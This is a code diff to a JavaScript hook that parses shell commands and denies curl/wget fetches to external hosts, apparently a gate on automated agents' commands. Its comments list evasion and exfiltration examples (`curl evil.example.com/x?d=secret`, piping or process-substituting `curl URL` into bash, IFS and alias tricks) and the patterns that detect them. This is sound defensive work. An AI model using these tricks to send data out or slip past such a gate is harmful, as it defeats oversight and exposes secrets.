@@ -25,8 +25,10 @@
 //      resolved by prefix the way curl and wget do, an unknown or ambiguous one denies, a wget -e
 //      command outside a small allow list denies, and so does a proxy / rc-file variable assigned in
 //      a command that runs either verb (#1931 review);
-//   6. a command line given to a shell as a string (`bash -c '...'`, `sh -lc "..."`, `eval '...'`)
-//      gets the whole analysis, like a heredoc fed to a shell (4.).
+//   6. a command line given to a shell as a string (`bash -c '...'`, `sh -lc "..."`, `eval '...'`,
+//      `trap '...' SIG`) gets the whole analysis, like a heredoc fed to a shell (4.). A shell that
+//      reads its program from a substitution (`bash <(...)`, `bash < <(...)`) denies, like one
+//      reading it from a pipe (8.).
 //   7. (#1931 delta review 5529333917) a SHELL FUNCTION defined in the command: each call is judged
 //      as the function body with the call's arguments in $1..$9 (like `sh -c`); a function that would
 //      deny and is named anywhere but a plain call (eval, trap, export -f) denies;
@@ -35,7 +37,10 @@
 //      arguments of a command outside NAMES_ONLY denies, fail closed, and a shell reading its program
 //      from a pipe denies;
 //   9. a command word bash EXPANDS (`$X`, brace expansion, a glob): if it can be curl or wget, it
-//      denies.
+//      denies. A command of quoted words only (`"$@"`, `"${X[@]}"`) is read too, and "$@" / $* split
+//      into words the way bash splits them; next to an IFS assignment any `$` command word denies;
+//      an alias whose value names curl / wget denies (#1931 delta review 5572280679).
+//  10. a subshell paren needs no space: `(curl URL)` is read as `curl URL`.
 // The command word is found past assignments, shell keywords and the PREFIX_WORDS commands with
 // their own options (timeout, stdbuf, nice, nohup, env, sudo, command, exec, time), on every path.
 // FALSE-POSITIVE POLICY. A body that uses a network primitive is denied for ANY external URL in it,
@@ -97,7 +102,9 @@
 //   - an interpreter body that reaches the network without a recognised primitive name (a subprocess
 //     running a downloader, a browser driver, encoded or obfuscated code such as -EncodedCommand);
 //   - a copy or link of the curl / wget binary made by an EARLIER call: this command never names it
-//     (making the copy in the same command denies, 8.);
+//     (making the copy in the same command denies, 8., `cp $(which curl) x` included);
+//   - other programs that run a command line from their own language: awk system(), vim -c '!...',
+//     osascript do shell script, make -f <(...): the interpreter-subprocess family, tracked in #2008;
 //   - every other network-capable binary (git, pip, npm, ssh, scp, rsync, dig ...).
 // Closing those is direction (b): an allowlist / network-level gate, not this hook.
 //
@@ -416,10 +423,20 @@ function backtickEnd(text, i) { // text[i] is ` -> index just past the closing `
   while (j < text.length && text[j] !== '`') j += text[j] === '\\' ? 2 : 1
   return Math.min(j + 1, text.length)
 }
+// #1931 delta review 5572280679 (non-blocking): a substitution that LOOKS UP the curl / wget binary
+// (`$(which curl)`, `$(command -v wget)`, `` `type -p curl` ``) yields its path. Its place is filled
+// with `$`s ending in `/curl` (or `/wget`) instead of `$`s only, so the program name survives: as an
+// argument, `cp $(which curl) /tmp/c` is the copy it is (launched, 8.); as the command word it is
+// still computed at run time (`command -v` may print an alias or a function), so it denies as before.
+const BINARY_LOOKUP = /^\s*(?:\S*\/)?(?:which|whereis|type|command|readlink|realpath)\b/
+function placeholder(inner, len) {
+  const name = BINARY_LOOKUP.test(inner) ? /\b(curl|wget)\b/.exec(inner)?.[1] : undefined
+  return name && len > name.length + 1 ? '$'.repeat(len - name.length - 1) + '/' + name : '$'.repeat(len)
+}
 export function liftSubstitutions(text) {
   // herestrings: offsets of every LIVE `<<<` operator (blanked in `stripped`, so the caller cannot
   // find them there any more). A `<<<` inside quotes or a heredoc body is text and is not listed.
-  const inners = []; const innerAts = []; const herestrings = []; const bodies = []; let out = ''; let i = 0
+  const inners = []; const innerAts = []; const innerEnds = []; const herestrings = []; const bodies = []; let out = ''; let i = 0
   // A live substitution at `at` is lifted (inner kept); returns the next index or -1.
   // Its place is filled with `$` (length-preserving), not blanked (#1931, round 3): the value is
   // computed at run time, so wherever it lands -- a curl / wget destination, a variable that later
@@ -432,11 +449,13 @@ export function liftSubstitutions(text) {
   const lift = (at, procSubst = false) => {
     if ((text[at] === '$' || (procSubst && (text[at] === '<' || text[at] === '>'))) && text[at + 1] === '(') {
       const j = substEnd(text, at)
-      inners.push(text.slice(at + 2, j - 1)); innerAts.push(at); out += '$'.repeat(j - at); return j
+      const inner = text.slice(at + 2, j - 1)
+      inners.push(inner); innerAts.push(at); innerEnds.push(j); out += placeholder(inner, j - at); return j
     }
     if (text[at] === '`') {
       const j = backtickEnd(text, at)
-      inners.push(text.slice(at + 1, j - 1).replace(/\\([$`\\])/g, '$1')); innerAts.push(at); out += '$'.repeat(j - at); return j
+      const inner = text.slice(at + 1, j - 1).replace(/\\([$`\\])/g, '$1')
+      inners.push(inner); innerAts.push(at); innerEnds.push(j); out += placeholder(inner, j - at); return j
     }
     return -1
   }
@@ -472,6 +491,7 @@ export function liftSubstitutions(text) {
       // by processing it recursively, then continue with the body
       const lineRest = liftSubstitutions(text.slice(i, nl + 1))
       out += lineRest.stripped; inners.push(...lineRest.inners); innerAts.push(...lineRest.innerAts.map((p) => p + i))
+      innerEnds.push(...lineRest.innerEnds.map((p) => p + i))
       herestrings.push(...lineRest.herestrings.map((p) => p + i)); i = nl + 1
       const endRx = new RegExp(`^[ \\t]*${tag.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}[ \\t]*$`, 'm')
       const rel = endRx.exec(text.slice(i))
@@ -508,7 +528,7 @@ export function liftSubstitutions(text) {
     if (n !== -1) { i = n; continue }
     out += c; i++
   }
-  return { stripped: out, inners, innerAts, herestrings, bodies }
+  return { stripped: out, inners, innerAts, innerEnds, herestrings, bodies }
 }
 // curl's DESTINATION is not only a scheme-bearing URL. A positional argument is always a URL to
 // curl, and with no scheme curl guesses http:// -- so `curl evil.example.com/x?d=secret` reaches
@@ -589,6 +609,13 @@ const CURL_LONG = optionTable([
 const CURL_DEST_URL = new Set(['url', 'proxy', 'preproxy', 'socks4', 'socks4a', 'socks5', 'socks5-hostname', 'proxy1.0', 'doh-url', 'ipfs-gateway', 'x'])
 const CURL_DEST_PARTS = new Set(['connect-to', 'resolve']) // host:port:host:port / host:port:addr
 const CURL_HIDDEN_DEST = new Set(['K', 'config', 'alt-svc'])
+// --dns-servers ip[:port][,ip...] sends the name lookup to those servers, which answer with any address
+// for the vendor host: a redirect of the same kind as --resolve (#1931 delta review 5572280679). Each
+// server is a destination; one on the local / private network passes. wget has the same option.
+const DNS_SERVERS = 'dns-servers'
+function dnsServerHosts(v) {
+  return String(v ?? '').split(',').filter(Boolean).map((x) => destHost(x) ?? x)
+}
 const HOSTNAME = /^(?:localhost|\d{1,3}(?:\.\d{1,3}){3}|\[[0-9a-f:.]+\]|(?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\.)+[a-z]{2,})$/i
 
 // Split a shell text into words, honouring quotes and backslashes (substitutions are already lifted).
@@ -656,6 +683,7 @@ export function curlDestinations(args) {
     if (CURL_HIDDEN_DEST.has(name)) dests.push(CURL_HIDDEN)
     else if (CURL_DEST_URL.has(name)) addUrl(v)
     else if (CURL_DEST_PARTS.has(name)) addParts(v)
+    else if (name === DNS_SERVERS) dests.push(...dnsServerHosts(v))
   }
   let positionalOnly = false
   for (let k = 0; k < args.length; k++) {
@@ -759,6 +787,7 @@ export function wgetDestinations(args) {
   const judgeValue = (name, v) => {
     if (WGET_HIDDEN_DEST.has(name)) dests.push(WGET_HIDDEN)
     else if ((name === 'e' || name === 'execute') && !wgetExecuteAllowed(v)) dests.push(`<wget -e: ${String(v ?? '').trim()}>`)
+    else if (name === DNS_SERVERS) dests.push(...dnsServerHosts(v))
   }
   let positionalOnly = false
   for (let k = 0; k < args.length; k++) {
@@ -942,6 +971,13 @@ export function shellCommandCall(cmd, text) {
   const at = argv.findIndex((w) => w.split('/').pop() === cmd)
   if (at === -1) return null
   if (cmd === 'eval') return { body: argv.slice(at + 1).join(' '), args: [] }
+  // `trap 'ACTION' SIG...` eval's ACTION in this shell when the signal comes (#1931 delta review
+  // 5572280679, 4). One word alone is a signal to reset, and `-` / an empty action resets or ignores.
+  if (cmd === 'trap') {
+    let k = at + 1
+    while (argv[k] === '--' || /^-[lpP]+$/.test(argv[k] ?? '')) { if (argv[k++] !== '--') return null }
+    return argv.length - k >= 2 && argv[k] !== '-' && argv[k] !== '' ? { body: argv[k], args: [] } : null
+  }
   if (!SHELL.test(cmd)) return null
   let sawC = false
   for (let k = at + 1; k < argv.length; k++) {
@@ -967,11 +1003,37 @@ const POSITIONAL_REF = /\$(?:\{[0-9@*#][^}]*\}|[0-9@*])/
 const PLAIN_ARG = /^[A-Za-z0-9._~:/?#@%+=,\[\]-]*$/
 export function positionalBody(body, args) {
   if (!POSITIONAL_REF.test(body)) return body
-  const fetches = /\b(?:curl|wget)\b/.test(body)
+  // The ARGUMENTS count too (#1931 delta review 5572280679, 2): in `f(){ watch "${1:-x}"; }; f "curl
+  // URL"` the body names neither verb, the call does, and a `$` handed to a launcher is not denied by
+  // itself. Measured cost: 3 of 13144 fleet commands, each a gate-test harness passing a curl command
+  // line to a function as text.
+  const fetches = /\b(?:curl|wget)\b/.test(body) || args.some((a) => /\b(?:curl|wget)\b/.test(a))
   const moves = /\b(?:shift|getopts)\b|\bset\b[^;&|\n]*(?:\s--(?:\s|$)|\s[^-+\s])/.test(body)
-  const faithful = !moves && !/\$\{?[@*]|\$\{[0-9][^}]/.test(body) && args.every((a) => PLAIN_ARG.test(a))
+  const faithful = !moves && !/\$\{[0-9@*][^}]/.test(body) && args.every((a) => PLAIN_ARG.test(a))
   if (!faithful) return fetches ? null : body
-  return body.replace(/\$\{([0-9])\}|\$([0-9])/g, (all, a, b) => args[Number(a ?? b)] ?? '')
+  return substitutePositionals(body, args)
+}
+// $0..$9 / ${0}..${9} become the argument; $@ / $* the arguments from $1 on, as bash splits them:
+// separate words, also inside double quotes, except "$*", which is one word. Inside '...' nothing is
+// substituted. The arguments are PLAIN_ARG words, so pasting them cannot re-quote anything.
+function substitutePositionals(body, args) {
+  const rest = args.slice(1)
+  let out = ''; let q = null
+  for (let k = 0; k < body.length; k++) {
+    const c = body[k]
+    if (q === "'") { out += c; if (c === "'") q = null; continue }
+    if (c === '\\') { out += body.slice(k, k + 2); k++; continue }
+    if (c === "'" && q === null) { q = c; out += c; continue }
+    if (c === '"') { q = q === '"' ? null : '"'; out += c; continue }
+    const m = c === '$' ? /^\$(?:\{([0-9@*])\}|([0-9@*]))/.exec(body.slice(k)) : null
+    if (!m) { out += c; continue }
+    const ref = m[1] ?? m[2]
+    if (/[0-9]/.test(ref)) out += args[Number(ref)] ?? ''
+    else if (ref === '*' && q === '"') out += rest.join(' ')
+    else out += q === '"' ? rest.join('" "') : rest.join(' ')
+    k += m[0].length - 1
+  }
+  return out
 }
 const NESTING_LIMIT = { deny: true, reason: 'nesting-limit', hosts: ['<too deeply nested to read>'] }
 const MAX_DEPTH = 4
@@ -1013,6 +1075,27 @@ export function functionDefs(masked) {
     defs.push({ name: m[1] ?? m[2], start, bodyStart: open + 1, bodyEnd: Math.min(k, masked.length), end: Math.min(k + 1, masked.length) })
   }
   return defs
+}
+// #1931 delta review 5572280679, 1: a SUBSHELL paren needs no space (`(curl URL)`, `x && (wget URL)`),
+// so read word by word it glued itself to the command word (`(curl`) and to the last argument. The
+// offsets of every subshell `(` and its matching `)` in the masked text are returned, to be blanked:
+// what is left is the command line the subshell runs. Not a subshell: an array assignment `X=(...)`
+// / `X+=(...)` and an escaped `\(`. `((` is blanked too: bash reads it as arithmetic, and where that
+// fails to parse, as two subshells, so the inner text is judged either way. An unmatched `(` is
+// blanked (a fetch behind it is still read); an unmatched `)` (a case pattern) is left alone.
+export function subshellParens(masked) {
+  const out = []; const stack = []
+  for (let k = 0; k < masked.length; k++) {
+    const c = masked[k]
+    if (c === '(') {
+      const sub = masked[k - 1] !== '=' && masked[k - 1] !== '\\'
+      stack.push(sub ? k : null)
+      if (sub) out.push(k)
+    } else if (c === ')' && masked[k - 1] !== '\\' && stack.length) {
+      if (stack.pop() !== null) out.push(k)
+    }
+  }
+  return out
 }
 function blankRanges(text, ranges) {
   let out = text
@@ -1109,8 +1192,54 @@ const STRING_LAUNCHERS = new Set(['xargs', 'parallel', 'find', 'watch', 'su', 'r
   'tmux', 'screen', 'systemd-run', 'xvfb-run', 'unbuffer', 'ionice', 'chrt', 'taskset', 'doas', 'sg',
   'firejail', 'strace', 'ltrace', 'nsenter', 'unshare', 'chroot', 'entr', 'at', 'batch'])
 const FIND_EXEC = new Set(['-exec', '-execdir', '-ok', '-okdir'])
+// Launchers that add their INPUT to the command they start: xargs and parallel append it (or put it
+// where the replace string stands), find -exec puts the path at `{}`. A `sh -c` body they start
+// therefore gets arguments this command does not show: its $0..$9 / $@ / $* and the replace strings
+// are read as run-time values ($LAUNCHER_INPUT), never substituted from the visible words (#1931 delta
+// review 5572280679 follow-up: substituting them let `... | xargs sh -c '$0 "$@"'` through).
+const APPENDS_INPUT = new Set(['xargs', 'parallel', 'find'])
+const PARALLEL_REPLACE = /\{(?:\d*|\.|\/|\/\/|\/\.|#|%)\}/g
+function replaceStrings(cmd, args) {
+  const out = ['{}']
+  if (cmd === 'find') return out
+  for (let k = 0; k < args.length; k++) {
+    const m = /^(?:-I|--replace=?|-i)(.*)$/.exec(args[k])
+    if (!m) continue
+    const v = m[1] !== '' ? m[1] : args[k] === '-I' ? args[k + 1] : ''
+    if (v && /^[^\s'"$\\]+$/.test(v)) out.push(v)
+  }
+  return out
+}
+export function inputBody(cmd, body, args) {
+  const ph = '"$LAUNCHER_INPUT"'
+  let out = body.replace(/\$(?:\{[0-9@*][^}]*\}|[0-9@*])/g, ph).replace(PARALLEL_REPLACE, ph)
+  for (const r of replaceStrings(cmd, args)) out = out.split(r).join(ph)
+  return out
+}
+// The program word xargs / parallel start: the first word that is not one of their own options. When
+// it is a replace string (`xargs -I{} {} URL`, `parallel {} URL`), the input IS the program.
+const XARGS_OPT_VALUE = new Set(['-I', '-a', '-d', '-E', '-e', '-L', '-l', '-n', '-P', '-s', '--arg-file', '--delimiter',
+  '--max-lines', '--max-args', '--max-procs', '--max-chars', '--process-slot-var'])
+const PARALLEL_OPT_VALUE = new Set(['-j', '--jobs', '-S', '--sshlogin', '-a', '--arg-file', '-d', '--delimiter', '-I', '-n',
+  '-N', '-L', '--joblog', '--results', '--tmpdir', '--timeout', '--delay', '--colsep', '-C', '--tag-string', '--workdir', '--wd'])
+function launcherProgram(cmd, args) {
+  const withValue = cmd === 'xargs' ? XARGS_OPT_VALUE : PARALLEL_OPT_VALUE
+  for (let k = 0; k < args.length; k++) {
+    const w = args[k]
+    if (w === '--') return args[k + 1] ?? null
+    if (w.startsWith('-') && w.length > 1) { if (withValue.has(w)) k++; continue }
+    return w
+  }
+  return null
+}
 export function launchedFetch(cmd, args) {
   if (NAMES_ONLY.has(cmd)) return null
+  if (cmd === 'xargs' || cmd === 'parallel') {
+    const prog = launcherProgram(cmd, args)
+    if (prog !== null && (replaceStrings(cmd, args).includes(prog) || new RegExp(`^${PARALLEL_REPLACE.source}$`).test(prog))) {
+      return `its input as the program (${prog})`
+    }
+  }
   if (cmd === 'find') {
     // find runs only what follows -exec / -ok, up to `;` or `+`: that is a command line of its own.
     for (let k = 0; k < args.length; k++) {
@@ -1135,6 +1264,31 @@ export function launchedFetch(cmd, args) {
     // A brace / glob word that can expand to curl or wget, where it is the program a launcher starts.
     if (launcher && !/[\s$]/.test(w) && /[{}*?[]/.test(w) && mayBeFetcher(w)) return w
     if (launcher && /\s/.test(w) && /\b(?:curl|wget)\b/.test(w)) return w.slice(0, 60)
+  }
+  return null
+}
+// The substitution a shell in span [a, b) reads its program from -- its first operand, or the target
+// of a `<` redirection -- as its source text (`<(...)`), or null. Read on the masked words with their
+// offsets, against the lifted substitutions' ranges.
+function shellProgramFromSubstitution(masked, a, b, { innerAts, innerEnds }) {
+  const toks = [...masked.slice(a, b).matchAll(/\S+/g)].map((m) => ({ w: m[0], s: a + m.index, e: a + m.index + m[0].length }))
+  const subst = (t) => {
+    const n = innerAts.findIndex((p, x) => p < t.e && innerEnds[x] > t.s)
+    return n === -1 ? null : `<(...) / $(...) at ${innerAts[n]}`
+  }
+  let k = commandIndex(toks.map((t) => t.w)) + 1
+  for (; k < toks.length; k++) {
+    const w = toks[k].w
+    const redir = /^\d*(<>|<|>>?|&>>?)(&?)(.*)$/.exec(w)
+    if (redir) {
+      const target = redir[3] !== '' ? toks[k] : toks[++k]
+      if (redir[1] === '<' && target && subst(target)) return subst(target)
+      continue
+    }
+    if (w === '-o' || w === '+o' || w === '-O' || w === '+O') { k++; continue }
+    if ((w.startsWith('-') || w.startsWith('+')) && w !== '-' && w !== '--') continue
+    if (w === '--' || w === '-') continue
+    return subst(toks[k])
   }
   return null
 }
@@ -1183,7 +1337,13 @@ export function classify(command, depth = 0, vendorHosts = new Set(), vendorDoma
     const ranges = defs.map((d) => [d.start, d.end])
     orig = blankRanges(orig, ranges); masked = blankRanges(masked, ranges)
   }
+  const parens = subshellParens(masked)
+  if (parens.length) {
+    const ranges = parens.map((k) => [k, k + 1])
+    orig = blankRanges(orig, ranges); masked = blankRanges(masked, ranges)
+  }
   const inDef = (at) => defs.some((d) => at >= d.start && at < d.end)
+  const ifsSet = /(?:^|[\s;&|(!{])IFS\+?=/.test(masked)
   const calls = new Map()                                         // function name -> spans calling it
   if (fetches) {
     const redirect = envRedirect(masked) ?? envIndirect(orig, masked)
@@ -1254,7 +1414,13 @@ export function classify(command, depth = 0, vendorHosts = new Set(), vendorDoma
     const mw = words(masked.slice(a, b))
     const i = commandIndex(mw)
     // `env -S 'cmd'` has no command word of its own: its value is the command line.
-    if (i >= mw.length && !mw.some((w) => w.split('/').pop() === 'env')) continue
+    // A command made only of QUOTED words (`"curl" "URL"`, `"$@"`, `"${X[@]}"`) has none in the masked
+    // text either, yet bash runs it: it is skipped only when its unquoted words hold no command
+    // (#1931 delta review 5572280679, 2), or when the span starts inside a quoted payload.
+    if (i >= mw.length && !mw.some((w) => w.split('/').pop() === 'env')) {
+      const uw0 = shellWords(expand(orig.slice(a, b), env))
+      if (insideQuote(orig, a) || commandIndex(uw0) >= uw0.length) continue
+    }
     // Every loop reading AND the plain one: a loop variable can share its name with an assignment
     // elsewhere in the command (`for u in <local>; do ...; done; u=<external>; curl "$u"`), and a
     // loop-only reading would let the assigned value go unjudged.
@@ -1293,6 +1459,26 @@ export function classify(command, depth = 0, vendorHosts = new Set(), vendorDoma
       if (!insideQuote(orig, a) && !loopOnly && !/^\d*[<>]/.test(word) && /[$*?[{]/.test(word) && mayBeFetcher(word)) {
         return { deny: true, reason: 'expanded-command', hosts: [`<command word expanded at run time: ${word.slice(0, 40)}>`] }
       }
+      // An IFS set in this command re-splits every unquoted expansion, so a command word that was a
+      // `$` before this command's assignments were expanded (`IFS=_; c=curl_URL; $c`) is not the one
+      // word read above. Fail closed: such a word next to an IFS assignment denies.
+      if (ifsSet && !insideQuote(orig, a) && text === plain) {
+        const raw = shellWords(orig.slice(a, b))
+        const rw = raw[commandIndex(raw)] ?? ''
+        if (rw.includes('$')) return { deny: true, reason: 'ifs-expanded-command', hosts: [`<command word ${rw.slice(0, 40)} split by a changed IFS>`] }
+      }
+      // An alias is expanded when the next LINE is read (the shell snapshot may already have
+      // expand_aliases on): `alias c=curl` + newline + `c URL` runs curl unseen. An alias whose value
+      // names curl / wget, or starts with a word bash expands, denies.
+      if (cmd === 'alias' && !insideQuote(orig, a)) {
+        for (const x of args) {
+          const v = x.includes('=') ? x.slice(x.indexOf('=') + 1) : ''
+          const first = shellWords(v)[0] ?? ''
+          if (/\b(?:curl|wget)\b/.test(v.replace(/['"\\]/g, '')) || (/[$*?[{]/.test(first) && mayBeFetcher(first))) {
+            return { deny: true, reason: 'alias', hosts: [`<alias ${x.slice(0, 40)}>`] }
+          }
+        }
+      }
       // `env -S 'cmd args'` splits its value into the command line it runs.
       const envAt = uw.slice(0, ci).findIndex((w) => w.split('/').pop() === 'env')
       if (envAt !== -1) {
@@ -1315,10 +1501,18 @@ export function classify(command, depth = 0, vendorHosts = new Set(), vendorDoma
         const inner = sh === undefined ? null : shellCommandCall(sh.split('/').pop(), args.join(' ') === '' ? '' : text.slice(text.indexOf(sh)))
         if (inner !== null) {
           if (depth >= MAX_DEPTH) return NESTING_LIMIT
-          const body = positionalBody(inner.body, inner.args)
+          const body = APPENDS_INPUT.has(cmd) ? inputBody(cmd, inner.body, args) : positionalBody(inner.body, inner.args)
           if (body === null) return { deny: true, reason: 'launched-shell-positional', hosts: [`<${cmd} starts ${sh} -c with curl/wget arguments>`] }
           const r = classify(withDefs(body), depth + 1, vendorHosts, vendorDomains)
           if (r.deny) return { ...r, reason: `launched-shell-${r.reason}` }
+        }
+        // A shell whose program file IS a substitution (`bash <(echo 'curl URL')`, `sh $(mktemp)`), or
+        // whose stdin is redirected from one (`bash < <(...)`), runs the substitution's OUTPUT, which
+        // cannot be read here: the same source as the pipe below, so it denies the same way, curl named
+        // or not (#1931 delta review 5572280679, 3). `source <(...)` is denied in envIndirect.
+        if (SHELL.test(cmd) && shellCommandCall(cmd, text) === null) {
+          const src = shellProgramFromSubstitution(masked, a, b, lifted)
+          if (src) return { deny: true, reason: 'shell-substitution', hosts: [`<${cmd} runs the output of ${src}>`] }
         }
         // A shell that reads its program from stdin (no -c string, no script file) runs whatever the
         // pipe or redirection hands it: `echo 'curl URL' | sh`. A heredoc / here-string feed is judged
@@ -1333,8 +1527,8 @@ export function classify(command, depth = 0, vendorHosts = new Set(), vendorDoma
         if (depth >= MAX_DEPTH) return NESTING_LIMIT
         const body = positionalBody(call.body, call.args)
         if (body === null) return { deny: true, reason: 'shell-c-positional', hosts: ['<curl/wget argument from $1..$9, $@ or $*>'] }
-        // eval runs in this shell, so it sees this command's functions; `sh -c` does not.
-        const r = classify(cmd === 'eval' ? withDefs(body) : body, depth + 1, vendorHosts, vendorDomains)
+        // eval and a trap run in this shell, so they see this command's functions; `sh -c` does not.
+        const r = classify(cmd === 'eval' || cmd === 'trap' ? withDefs(body) : body, depth + 1, vendorHosts, vendorDomains)
         if (r.deny) return { ...r, reason: `shell-c-${r.reason}` }
       }
       let target = null
